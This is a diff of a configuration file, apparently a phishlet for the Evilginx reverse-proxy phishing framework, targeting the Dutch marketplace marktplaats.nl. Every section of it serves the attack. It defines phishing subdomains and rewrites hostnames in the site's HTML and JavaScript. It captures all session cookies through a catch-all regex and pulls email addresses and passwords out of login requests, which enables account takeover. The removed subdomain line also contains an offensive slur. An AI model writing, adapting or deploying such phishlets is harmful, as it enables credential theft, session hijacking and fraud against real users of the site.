@@ -1,29 +1,32 @@
-author: '@Jerp'
+author: '@charlesbel'
 min_ver: '2.3.0'
+
 proxy_hosts:
-  - {phish_sub: 'marktplaatskankerkinderewn', orig_sub: 'www', domain: 'marktplaats.nl', session: true, is_landing: true}
+  - {phish_sub: 'mijn', orig_sub: 'wwww', domain: 'marktplaats.nl', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'marktplaats.nl', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
-  - {triggers_on: 'marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: 'application/json;charset=utf-8', replace: 'application/json', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 auth_tokens:
- - domain: 'marktplaats.nl'
-   keys: ['MpSession(.*),regexp']
-
+  - domain: 'www.marktplaats.nl'
+    keys: ['.*,regexp']
+  - domain: '.marktplaats.nl'
+    keys: ['.*,regexp']
 auth_urls:
-  - '/home/news'
-  - '/home/.*'   
+  - '/messages'
 
 credentials:
   username:
     key: ''
-    search: '"email":"([^"]*)'
+    search: '"email":"([^"]*)"'
     type: 'json'
   password:
     key: ''
-    search: '"password":"([^"]*)'
+    search: '"password":"([^"]*)"'
     type: 'json'
 
 login:
   domain: 'www.marktplaats.nl'
-  path: '/account/login.html'
+  path: '/account/login.html?target=%2Fmessages'
